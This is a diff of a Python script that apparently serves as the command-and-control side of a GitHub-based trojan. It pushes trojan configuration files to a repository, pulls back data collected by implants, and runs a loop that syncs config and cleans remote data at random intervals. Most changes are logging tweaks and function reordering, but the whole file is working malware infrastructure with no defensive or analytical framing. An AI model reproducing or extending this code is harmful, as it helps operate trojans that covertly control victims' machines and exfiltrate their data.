@@ -1,5 +1,6 @@
 import base64
 import imp
+import inspect
 import json
 import os
 import random
@@ -40,6 +41,7 @@ def connect_to_github():
 
 	return gh, repo, branch
 
+
 def get_file_contents(filepath, f=None):
 
 	gh, repo, branch = connect_to_github()
@@ -61,6 +63,7 @@ def get_file_contents(filepath, f=None):
 				return blob.content
 
 	return None
+
 
 def compare_remote_config():
 	"""
@@ -85,7 +88,7 @@ def compare_remote_config():
 
 		print("[+] Creating config file...")
 		repo.create_file(trojan_config_path, "Deleted config file auto update", local_config_byte)
-		print('Exiting')
+		print('[=] Exiting')
 
 		return None
 
@@ -100,7 +103,7 @@ def compare_remote_config():
 
 		print("[+] Updating corrupted config file...")
 		repo.update_file(trojan_config_path, "Corrupted config file auto update.", local_config_byte, remote_sha)
-		print("Exiting")
+		print("[=] Exiting")
 
 		return None
 
@@ -111,40 +114,58 @@ def compare_remote_config():
 
 		print('[+] Updating config file...')
 		repo.update_file(trojan_config_path, "Config file auto update.", local_config_byte, remote_sha)
-		print("Exiting.")
+		print("[=] Exiting.")
 
 	return None
 
-def clean_remote_data(pathname):
-	"""
-		Cleans remote data after pull.
-
-		TODO: delete_file
-	"""
-
-	gh, repo, branch = connect_to_github()
-
-
-	pass
 
 def pull_remote_data(reponame, branch):
 	"""
 		Pulls data from remote repository.
 
-		TODO: exact local path(data)
+		TODO: add optional path to pulling
 	"""
 
 	try:
 		git_local = cmd.Git('.')
+		print("[+] Pulling files")
 		git_local.pull(reponame, branch)
 	except:
-		return None
-
-	clean_remote_data(trojan_data_path)
+		print("Unexpected error in %s:" % inspect.stack()[0][3], sys.exc_info()[0])
+		raise
 
 	return None
 
-#pull_remote_data(u_reposerver, u_branch)
+
+def clean_remote_data(pathname):
+	"""
+		Cleans remote data after pull.
+
+		TODO: don't pull if remote_dir is empty
+	"""
+
+	gh, repo, branch = connect_to_github()
+	tree = branch.commit.commit.tree.recurse()
+
+	# TODO
+	#pull_remote_data(u_reposerver, u_branch)
+
+	for datafile in tree.tree:
+		if pathname in datafile.path:
+
+			datafile_blob = repo.blob(datafile._json_data['sha'])
+
+			try:
+				print("Deleting: %s" % datafile.path)
+				#repo.delete_file(datafile.path, 'Data files auto delete', datafile_blob.sha)
+			except:
+				print("Unexpected error in %s:" % inspect.stack()[0][3], sys.exc_info()[0])
+				raise
+
+
+	print("[=] Exiting. No new files in %s" % pathname)
+	return None
+#clean_remote_data(trojan_data_path)
 
 
 def decode_local_data(pathname):
@@ -158,7 +179,7 @@ def decode_local_data(pathname):
 
 decode_local_data(trojan_data_path)
 
-def compare_local_data():
+def merge_local_data():
 	"""
 		Compares github client data with local.
 		Deletes and updates spare data.
@@ -166,6 +187,17 @@ def compare_local_data():
 		TODO:
 	"""
 
-	pull_remote_data(u_reposerver, u_branch)
-
 	pass
+
+
+# server main loop
+
+while True:
+
+	if task_queue.empty():
+		print("")
+
+		compare_remote_config()
+		clean_remote_data(trojan_data_path)
+
+	time.sleep(random.randint(1000, 5000))
